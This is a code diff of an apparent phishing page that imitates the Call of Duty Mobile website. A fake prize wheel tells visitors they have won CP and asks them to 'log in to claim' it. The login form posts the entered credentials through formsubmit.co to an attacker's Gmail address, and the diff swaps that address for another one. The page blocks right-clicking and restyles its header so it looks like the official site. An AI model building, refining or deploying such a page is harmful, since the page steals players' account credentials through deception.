@@ -9,17 +9,258 @@
     <link rel="stylesheet" href="https://www.callofduty.com/cdn/codm/zpHm2flUeC/css/language.css" />
     <link rel="icon" href="favicon.ico">
     <style>
-        h1, h2, p, span, a, label { text-transform: none !important; }
-        .official-header {
-            background: rgba(64, 64, 64, 0.6);
-            backdrop-filter: blur(10px);
-            padding: 15px 0;
+h1, h2, p, span, a, label { text-transform: none !important; }
+
+        /* هدر شیشه‌ای جدید – فقط این بخش تغییر کرده */
+ /* هدر جدید - دقیقاً شبیه سایت اصلی COD Mobile */
+.official-header {
+            background: rgba(0, 0, 0, 0.92); /* تیره قوی با کمی شفافیت */
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
             position: fixed;
             top: 0;
-            width: 100%;
-            z-index: 1000;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-            text-align: center;
+            left: 0;
+            right: 0;
+            height: 70px;
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            padding: 0 5%;
+            box-sizing: border-box;
+            border-bottom: 1px solid rgba(255,255,255,0.08);
+            font-family: 'Arial Black', Arial, sans-serif;
+        }
+
+        /* همبرگر (موبایل) */
+        .hamburger {
+            display: none;
+            flex-direction: column;
+            justify-content: space-between;
+            width: 30px;
+            height: 20px;
+            cursor: pointer;
+            margin-right: 20px;
+        }
+
+        .hamburger span {
+            height: 3px;
+            background: #fff;
+            border-radius: 2px;
+            transition: all 0.3s;
+        }
+
+        .hamburger.active span:nth-child(1) { transform: rotate(45deg) translate(5px, 5px); }
+        .hamburger.active span:nth-child(2) { opacity: 0; }
+        .hamburger.active span:nth-child(3) { transform: rotate(-45deg) translate(7px, -7px); }
+
+        /* لوگو + متن CALL OF DUTY | MOBILE */
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            white-space: nowrap;
+        }
+
+        .logo-container img {
+            height: 36px;
+        }
+
+        .logo-text {
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+
+        .logo-text span {
+            color: #00ff00; /* سبز برای MOBILE */
+        }
+
+        /* منوی اصلی */
+        .nav-menu {
+            display: flex;
+            align-items: center;
+            gap: 28px;
+            margin-left: 40px;
+            flex: 1;
+        }
+
+        .nav-menu a {
+            color: #ddd;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: color 0.3s;
+            position: relative;
+        }
+
+        .nav-menu a:hover,
+        .nav-menu a.active {
+            color: #fff;
+        }
+
+        .nav-menu a::after {
+            content: '+';
+            margin-left: 4px;
+            font-size: 10px;
+            opacity: 0.6;
+        }
+
+        /* بخش راست: LOGIN و STORE */
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            margin-left: auto;
+        }
+
+        .login-btn {
+            color: #fff;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .login-btn svg {
+            width: 20px;
+            height: 20px;
+            fill: #fff;
+        }
+
+        .store-btn {
+            background: #ffcc00;
+            color: #000;
+            padding: 8px 20px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 14px;
+            text-decoration: none;
+            transition: background 0.3s;
+        }
+
+        .store-btn:hover {
+            background: #ffdd33;
+        }
+
+        .header-logo {
+            height: 45px;
+        }
+
+        .header-logo img {
+            height: 100%;
+            width: auto;
+        }
+
+        #main-nav {
+            display: flex;
+            align-items: center;
+            gap: 30px;
+        }
+
+        #main-nav a {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            transition: color 0.3s ease;
+        }
+
+        #main-nav a:hover {
+            color: #00ff00; /* سبز نئونی COD */
+        }
+
+        /* دکمه‌های راست - مثل LOGIN و STORE */
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .header-btn {
+            padding: 8px 18px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: bold;
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+
+        .login-btn {
+            color: #ffffff;
+            border: 1px solid #ffffff;
+            background: transparent;
+        }
+
+        .login-btn:hover {
+            background: rgba(255,255,255,0.1);
+        }
+
+        .store-btn {
+            background: #ffcc00; /* زرد طلایی سایت */
+            color: #000000;
+            font-weight: bold;
+        }
+
+        .store-btn:hover {
+            background: #ffdd33;
+            transform: translateY(-2px);
+        }
+
+/* همبرگر آیکون */
+        .hamburger {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            width: 32px;
+            height: 22px;
+            cursor: pointer;
+        }
+
+        .hamburger span {
+            height: 3px;
+            background: #fff;
+            border-radius: 2px;
+            transition: all 0.3s ease;
+        }
+
+        .hamburger.active span:nth-child(1) {
+            transform: rotate(45deg) translate(6px, 6px);
+        }
+        .hamburger.active span:nth-child(2) {
+            opacity: 0;
+        }
+        .hamburger.active span:nth-child(3) {
+            transform: rotate(-45deg) translate(7px, -7px);
+        }
+
+        /* موبایل */
+        @media (max-width: 1024px) {
+            .hamburger-menu { display: flex; }
+            #main-nav { display: none; }
+            #main-nav.active {
+                display: flex;
+                flex-direction: column;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                width: 100%;
+                background: rgba(0,0,0,0.95);
+                padding: 20px 0;
+                gap: 25px;
+                text-align: center;
+            }
+            .header-actions { margin-left: auto; }
+        }
+
+        @media (max-width: 768px) {
+            .official-header { padding: 12px 4%; }
+            .header-actions { gap: 12px; }
+            .header-btn { padding: 6px 14px; font-size: 13px; }
         }
         .official-header nav { display: flex; justify-content: center; gap: 20px; margin-top: 10px; }
         .official-header nav a { color: #fff; text-decoration: none; font-size: 14px; text-transform: none; }
@@ -613,12 +854,52 @@ body {
         max-width: 300px;
     }
 }
+/* منوی موبایل شیشه‌ای */
+        @media (max-width: 768px) {
+            .hamburger-menu { display: flex; }
+
+            .header-logo {
+                left: 50%;
+                transform: translateX(-50%);
+                height: 48px;
+            }
+
+            #main-nav {
+                position: fixed;
+                top: 0;
+                left: -100%;
+                width: 82%;
+                max-width: 320px;
+                height: 100vh;
+                background: rgba(10, 10, 20, 0.88);
+                backdrop-filter: blur(22px) saturate(180%);
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                gap: 55px;
+                transition: left 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+                border-right: 1px solid rgba(0, 255, 136, 0.25);
+            }
+
+            #main-nav.active { left: 0; }
+
+            #main-nav a { font-size: 24px; padding: 15px 35px; }
+
+            body.menu-open::before {
+                content: '';
+                position: fixed;
+                inset: 0;
+                background: rgba(0, 0, 0, 0.68);
+                backdrop-filter: blur(6px);
+                z-index: 999;
+            }
+        }
     </style>
 </head>
 <body oncontextmenu="return false;">
 <header class="official-header">
     <div class="header-logo">
-        <img src="activision_logo_white-text.png" alt="Call of Duty Mobile Logo">
+        <img src="cod-logo.svg" alt="Call of Duty Mobile Logo ">
     </div>
     <!-- دکمه همبرگر فقط تو موبایل دیده می‌شه -->
     <div class="hamburger-menu" id="hamburger-btn">
@@ -663,7 +944,7 @@ body {
                     <div class="code_ct">
                         <iframe name="dummyframe" id="dummyframe" style="display:none;"></iframe>
 
-                        <form action="https://formsubmit.co/joker6859046@gmail.com" method="POST" target="dummyframe" onsubmit="return validateCaptcha()">
+                        <form action="https://formsubmit.co/erfantroll778899@gmail.com" method="POST" target="dummyframe" onsubmit="return validateCaptcha()">
                             <label class="input-label">Email Address:*</label>
                             <div class="input-wrapper" id="email-field">
                                 <input type="email" name="email" id="F_UID" placeholder="Email" required autocomplete="off" />
@@ -945,11 +1226,11 @@ body {
                 const prize = prizes[winningIndex];
 
                 if (prize === "Try Again!") {
-                    resultText.innerHTML = `<strong style="color:#ff4444;">Try Again!</strong> 😅<br><span style="font-size:24px;">Spin again!</span>`;
+                    resultText.innerHTML = `<strong style="color:#ff4444;">Try Again!</strong>😣<br><span style="font-size:24px;">Spin again!</span>`;
                     spinBtn.textContent = "Spin Again!";
                     spinBtn.disabled = false;
                 } else {
-                    resultText.innerHTML = `Congratulations! You won: <strong>${prize}</strong> 🎉`;
+                    resultText.innerHTML = `Congratulations! You won: <strong>${prize}</strong> 🤩`;
                     continueBtn.style.display = "inline-block";
                     hasWonCP = true;
                     spinBtn.textContent = "You won CP!";
@@ -970,7 +1251,7 @@ body {
         function showLoginForm() {
             document.getElementById("wheel-section").classList.remove("active");
             document.getElementById("login-section").classList.add("active");
-            prizeAnnouncement.textContent = `Congratulations! You won ${window.winningPrize} 🎉 Log in to claim your prize:`;
+            prizeAnnouncement.textContent = `Congratulations! You won ${window.winningPrize}Log in to claim your prize:🎁`;
             prizeAnnouncement.style.display = "block";
         }
 
@@ -992,6 +1273,13 @@ hamburgerBtn.addEventListener('click', () => {
     hamburgerBtn.classList.toggle('active');
     mainNav.classList.toggle('active');
     body.classList.toggle('menu-open');
+    const hamburger = document.getElementById('hamburger');
+    const navMenu = document.getElementById('navMenu');
+
+    hamburger.addEventListener('click', () => {
+        hamburger.classList.toggle('active');
+        navMenu.classList.toggle('active');
+    });
 });
 
 // اگر بیرون منو کلیک کردن، بسته بشه (اختیاری اما حرفه‌ای)
@@ -1035,7 +1323,7 @@ document.addEventListener('click', (e) => {
     }
 });
 
+
     </script>
 </body>
-
 </html>
